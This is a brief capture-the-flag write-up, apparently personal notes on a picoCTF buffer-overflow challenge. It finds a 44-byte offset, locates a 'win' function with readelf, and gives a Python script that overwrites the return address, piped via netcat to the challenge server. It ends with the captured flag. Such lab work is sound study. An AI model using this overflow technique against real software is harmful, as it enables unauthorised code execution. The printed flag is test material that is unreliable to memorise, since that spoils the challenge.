- tested inputting several "a"s to find out when the a's were being printed
- found out that I gotta have 44 "a" characters to fill the stack
- after that I can type the address

- read the vuln file to check what memory address had the "win" function:
	readelf -s vuln

- found out that "win" function is in address 0x080491f6

- wrote a python script to print 44 A'a and then print the address needed in little indian:
	#!/usr/bin/python
	# -*- coding: utf-8 -*-

	import sys
	import socket
	from struct import *

	offset = "A" * 44
	eip = pack('<I', 0x080491f6)

	print (offset+eip)

- piped the script with the netcat to the server:
	./script.py | nc saturn.picoctf.net 59485	

- grabbed flag

- flag:
	picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
